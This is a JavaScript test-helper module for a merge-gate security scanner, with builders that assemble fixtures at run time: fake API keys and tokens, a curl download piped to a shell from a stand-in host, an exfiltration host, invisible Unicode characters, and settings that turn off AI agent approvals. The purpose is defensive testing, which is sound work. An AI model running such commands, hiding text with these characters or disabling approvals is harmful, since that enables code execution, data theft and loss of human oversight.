// Shared test helpers: run the engine in memory on a change or a set of files, with no git and no network.
//
// Fixture secrets, hidden characters and shell one-liners are assembled at run time (join, fromCodePoint), never
// written out literally, so this repository passes its own merge gate.
import { createHash } from "node:crypto";
import { runCheck, runScan, parseConfig } from "../dist/engine/index.js";

/** Line diff by longest common subsequence: removed and added lines with numbers, like `git diff --unified=0`. */
export function lineDiff(before, after) {
  const a = before === null ? [] : before.split("\n");
  const b = after === null ? [] : after.split("\n");
  if (a.at(-1) === "") a.pop();
  if (b.at(-1) === "") b.pop();
  const n = a.length;
  const m = b.length;
  const dp = Array.from({ length: n + 1 }, () => new Array(m + 1).fill(0));
  for (let i = n - 1; i >= 0; i--) for (let j = m - 1; j >= 0; j--) dp[i][j] = a[i] === b[j] ? dp[i + 1][j + 1] + 1 : Math.max(dp[i + 1][j], dp[i][j + 1]);
  const removed = [];
  const added = [];
  let i = 0;
  let j = 0;
  while (i < n || j < m) {
    if (i < n && j < m && a[i] === b[j]) { i++; j++; }
    else if (j < m && (i >= n || dp[i][j + 1] >= dp[i + 1][j])) { added.push({ line: j + 1, text: b[j] }); j++; }
    else { removed.push({ line: i + 1, text: a[i], newAt: Math.max(1, j) }); i++; }
  }
  return { removed, added };
}

/** Run check mode on an in-memory change: maps of path -> content before and after (null or missing: absent). */
export async function gate(before, after, opts = {}) {
  const paths = [...new Set([...Object.keys(before), ...Object.keys(after)])].sort();
  const files = [];
  for (const p of paths) {
    const b = before[p] ?? null;
    const a = after[p] ?? null;
    if (b === a) continue;
    const status = b === null ? "added" : a === null ? "deleted" : "modified";
    const { removed, added } = lineDiff(b, a);
    files.push({ oldPath: status === "added" ? null : p, newPath: status === "deleted" ? null : p, status, binary: false, removed, added });
  }
  const config = opts.config ?? parseConfig(opts.policy ?? null).config;
  return runCheck(
    { files, before: async (p) => before[p] ?? null, after: async (p) => after[p] ?? null },
    {
      base: "main", head: "HEAD", fetch: opts.fetch ?? (async () => { throw new Error("no network in tests"); }),
      offline: opts.fetch === undefined, now: opts.now ?? new Date("2026-11-22T10:00:00Z"), config,
      ...(opts.allowConfigReason ? { allowConfigReason: opts.allowConfigReason } : {}),
      ...(opts.allowTestReason ? { allowTestReason: opts.allowTestReason } : {}),
      ...(opts.waivers ? { waivers: opts.waivers } : {}),
      scope: opts.scope ?? [], prBody: opts.prBody ?? null,
    },
  );
}

/** Run scan mode on in-memory files. */
export function scanOf(files, opts = {}) {
  return runScan(
    Object.entries(files).map(([path, text]) => ({ path, text, tracked: opts.untracked?.includes(path) !== true })),
    { root: "fixture", config: opts.config ?? parseConfig(opts.policy ?? null).config },
  );
}

export const findings = (summary) => summary.results.flatMap((r) => r.findings);
/** "ruleId:level" for every finding, sorted, for exact assertions. */
export const ids = (summary) => findings(summary).map((f) => `${f.ruleId}:${f.level}`).sort();
export const byRule = (summary, id) => findings(summary).filter((f) => f.ruleId === id);

// ---------------------------------------------------------------- fixture builders (assembled at run time)
/** Deterministic, well-mixed characters: SHA-256 of a counter, mapped onto the alphabet. */
const pick = (seed, alphabet, n) => {
  let out = "";
  for (let block = 0; out.length < n; block++) {
    for (const byte of createHash("sha256").update(`${seed}:${block}`).digest()) {
      if (out.length < n) out += alphabet[byte % alphabet.length];
    }
  }
  return out;
};
const UPPER_DIGITS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
const ALNUM = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

export const fake = {
  awsKeyId: () => ["AK", "IA", pick(7, UPPER_DIGITS, 16)].join(""),
  githubToken: () => ["gh", "p_", pick(11, ALNUM, 36)].join(""),
  anthropicKey: () => ["sk-ant-", "api03-", pick(13, ALNUM, 93)].join(""),
  stripeLive: () => ["sk_", "live_", pick(17, ALNUM, 24)].join(""),
  stripeTest: () => ["sk_", "test_", pick(19, ALNUM, 24)].join(""),
  privateKeyHeader: () => ["-----BEGIN ", "RSA PRIVATE ", "KEY-----"].join(""),
  serviceRoleJwt: () => {
    const b64 = (o) => Buffer.from(JSON.stringify(o)).toString("base64url");
    return [b64({ alg: "HS256", typ: "JWT" }), b64({ iss: "supabase", ref: "abcdefghijklmnop", role: "service_role", iat: 1700000000 }), pick(23, ALNUM, 43)].join(".");
  },
  anonJwt: () => {
    const b64 = (o) => Buffer.from(JSON.stringify(o)).toString("base64url");
    return [b64({ alg: "HS256", typ: "JWT" }), b64({ iss: "supabase", ref: "abcdefghijklmnop", role: "anon", iat: 1700000000 }), pick(29, ALNUM, 43)].join(".");
  },
  /** A download piped straight into a shell, assembled so the pipe never appears in this file next to the command. */
  pipeToShell: (url = "https://get.evil-example.dev/install.sh") => ["curl -fsSL " + url, "sh"].join(" | "),
  /** Unicode tag characters spelling `text` (invisible). */
  tags: (text) => [...text].map((c) => String.fromCodePoint(0xe0000 + c.charCodeAt(0))).join(""),
  bidi: () => String.fromCodePoint(0x202e),
  zeroWidth: () => String.fromCodePoint(0x200b),
  skipPermissions: () => ["--dangerously-skip-", "permissions"].join(""),
  exfilHost: () => ["webhook", "site"].join("."),
  nosec: () => ["# no", "sec"].join(""),
  tsIgnore: () => ["// @ts-", "ignore"].join(""),
  tsNocheck: () => ["// @ts-", "nocheck"].join(""),
  /** The opening line of a skipped test. */
  skip: (name) => [["test", "skip"].join("."), `("${name}", () => {`].join(""),
  /** The whole environment, serialised. */
  wholeEnv: () => ["JSON.stringify(process", "env)"].join("."),
  /** Codex and VS Code settings that turn approvals off. */
  codexNeverAsk: () => ["approval_policy = ", '"never"'].join(""),
  vscodeAutoApprove: () => ['{ "chat.tools.', 'autoApprove": true }'].join(""),
  nosemgrep: () => ["// no", "semgrep"].join(""),
};
